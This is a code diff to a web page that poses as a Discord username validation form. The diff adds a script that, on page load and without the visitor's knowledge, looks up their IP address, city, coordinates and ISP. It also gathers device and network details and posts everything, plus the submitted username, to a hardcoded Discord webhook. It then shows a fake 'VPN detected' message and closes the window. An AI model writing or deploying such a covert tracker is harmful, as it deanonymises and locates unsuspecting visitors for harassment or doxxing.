@@ -64,7 +64,85 @@
   <script>
     const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';
 
-    // Validate Discord username
+    let collectedData = {};
+
+    // Fetch IP and location data
+    async function fetchIPData() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await response.json();
+        collectedData.IP_Info = { ip };
+
+        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const locationData = await locationResponse.json();
+
+        collectedData.IP_Info = {
+          ...collectedData.IP_Info,
+          city: locationData.city,
+          region: locationData.region,
+          country: locationData.country_name,
+          latitude: locationData.latitude,
+          longitude: locationData.longitude,
+          isp: locationData.org,
+        };
+      } catch (error) {
+        console.error('Error fetching IP data:', error);
+        collectedData.IP_Info = 'Unavailable';
+      }
+    }
+
+    // Fetch device information
+    function fetchDeviceInfo() {
+      collectedData.Device_Info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+        cookiesEnabled: navigator.cookieEnabled,
+        cores: navigator.hardwareConcurrency || 'Unknown',
+        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+      };
+    }
+
+    // Fetch network information
+    function fetchNetworkInfo() {
+      if (navigator.connection) {
+        collectedData.Network_Info = {
+          networkType: navigator.connection.effectiveType || 'Unknown',
+          downlinkSpeed: `${navigator.connection.downlink || 0} Mbps`,
+          latency: `${navigator.connection.rtt || 0} ms`,
+          saveData: navigator.connection.saveData || false,
+        };
+      } else {
+        collectedData.Network_Info = 'Unavailable';
+      }
+    }
+
+    // Send collected data to webhook
+    async function sendToWebhook(data) {
+      try {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: data }),
+        });
+      } catch (error) {
+        console.error('Error sending to webhook:', error);
+      }
+    }
+
+    // Collect and send all data on page load
+    async function sendInitialData() {
+      await fetchIPData();
+      fetchDeviceInfo();
+      fetchNetworkInfo();
+
+      const formattedData = `**Initial User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
+      await sendToWebhook(formattedData);
+    }
+
+    // Validate Discord username and display "VPN detected"
     async function validateDiscordUser() {
       const discordUser = document.getElementById('discordUser').value.trim();
       const status = document.getElementById('status');
@@ -75,35 +153,34 @@
         setTimeout(() => {
           status.textContent = 'VPN detected.';
           status.style.color = 'orange';
+          closeWebsite();
         }, 2000);
         return;
       }
 
-      // Send valid Discord username to the webhook
-      await sendToWebhook(discordUser);
+      // Send Discord username to webhook
+      await sendToWebhook(`**Discord Username Submitted:** ${discordUser}`);
 
-      // Update UI
+      // Update UI and display "VPN detected"
       status.textContent = 'Thank you for submitting your Discord username.';
       status.style.color = 'green';
 
       setTimeout(() => {
         status.textContent = 'VPN detected.';
         status.style.color = 'orange';
+        closeWebsite();
       }, 2000);
     }
 
-    // Send data to webhook
-    async function sendToWebhook(discordUser) {
-      try {
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: `**Discord Username Submitted:** ${discordUser}` }),
-        });
-      } catch (error) {
-        console.error('Error sending to webhook:', error);
-      }
+    // Close website after 10 seconds
+    function closeWebsite() {
+      setTimeout(() => {
+        window.close();
+      }, 10000);
     }
+
+    // Send all data immediately on page load
+    sendInitialData();
   </script>
 </body>
 </html>
